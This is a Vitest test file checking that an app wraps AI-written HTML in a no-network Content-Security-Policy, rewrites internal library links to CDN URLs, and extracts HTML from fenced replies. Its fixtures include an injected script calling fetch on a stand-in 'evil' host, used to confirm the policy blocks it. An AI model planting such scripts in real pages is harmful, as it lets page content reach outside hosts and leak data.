import { expect, it } from 'vitest'
import { extractHtml, wrapVisual } from '../src/main/visual'

it('puts the no-network policy before any model-written script', () => {
  for (const html of [
    '<!DOCTYPE html><html><head><script>fetch("https://evil")</script></head></html>',
    '<script>fetch("https://evil")</script><p>hi</p>',
  ]) {
    const doc = wrapVisual(html)
    expect(doc.toLowerCase().startsWith('<!doctype html>')).toBe(true)
    const csp = doc.indexOf("connect-src 'none'")
    expect(csp).toBeGreaterThan(0)
    expect(csp).toBeLessThan(doc.indexOf('fetch("https://evil")'))
    expect(doc.indexOf('window.steve')).toBeLessThan(doc.indexOf('fetch("https://evil")'))
  }
})

it('saved copies load the same libraries from a CDN and still block the network', () => {
  const cdn = { three: 'https://cdn.jsdelivr.net/npm/three@0.187.0/', chart: 'https://cdn.jsdelivr.net/npm/chart.js@4.6.1/dist/' }
  const doc = wrapVisual('<script src="steve://lib/chart/chart.umd.min.js"></script><script type="module">import "three"</script>', cdn)
  expect(doc).not.toContain('steve:')
  expect(doc).toContain('src="https://cdn.jsdelivr.net/npm/chart.js@4.6.1/dist/chart.umd.min.js"')
  expect(doc).toContain('"three":"https://cdn.jsdelivr.net/npm/three@0.187.0/build/three.module.js"')
  expect(doc).toContain("script-src 'unsafe-inline' https://cdn.jsdelivr.net")
  expect(doc).toContain("connect-src 'none'")
})

it('extracts HTML from a fenced reply', () => {
  expect(extractHtml('Here you go:\n```html\n<p>x</p>\n```\nEnjoy')).toBe('<p>x</p>')
  expect(extractHtml('<p>plain</p>')).toBe('<p>plain</p>')
})
